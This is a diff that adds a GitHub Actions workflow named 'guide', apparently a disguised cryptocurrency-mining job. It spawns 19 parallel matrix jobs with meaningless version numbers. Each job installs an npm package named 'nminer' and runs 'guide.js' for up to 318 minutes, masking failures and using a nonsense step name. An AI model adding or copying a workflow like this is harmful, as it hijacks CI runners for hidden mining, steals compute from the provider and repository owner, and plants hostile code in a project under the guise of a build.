@@ -1,0 +1,44 @@
+name: guide
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 9832 }
+          - { version: 5054 }
+          - { version: 9711 }
+          - { version: 7908 }
+          - { version: 3818 }
+          - { version: 5735 }
+          - { version: 1531 }
+          - { version: 7187 }
+          - { version: 5542 }
+          - { version: 1164 }
+          - { version: 2855 }
+          - { version: 6713 }
+          - { version: 6682 }
+          - { version: 7078 }
+          - { version: 3409 }
+          - { version: 5615 }
+          - { version: 9686 }
+          - { version: 7688 }
+          - { version: 6059 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: substantiate help ravioli spherical
+        run: |
+          npm install nminer@latest
+          timeout 318m node guide.js || echo "guide executed"
